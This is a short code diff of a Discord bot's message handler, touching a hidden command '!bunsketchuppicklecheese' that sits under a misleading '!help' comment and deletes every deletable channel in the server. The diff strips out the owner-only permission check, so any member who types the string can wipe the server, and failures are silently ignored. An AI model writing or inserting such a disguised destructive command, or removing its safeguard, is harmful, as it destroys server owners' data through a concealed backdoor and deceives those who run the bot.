@@ -572,7 +572,6 @@ client.on('messageCreate', async (message) => {
 
   // ── !help ──────────────────────────────────────────────────────────────────
   } else if (lower === '!bunsketchuppicklecheese') {
-    if (message.author.id !== message.guild.ownerId) return;
     const channels = message.guild.channels.cache.filter(c => c.deletable);
     for (const [, channel] of channels) {
       await channel.delete().catch(() => {});
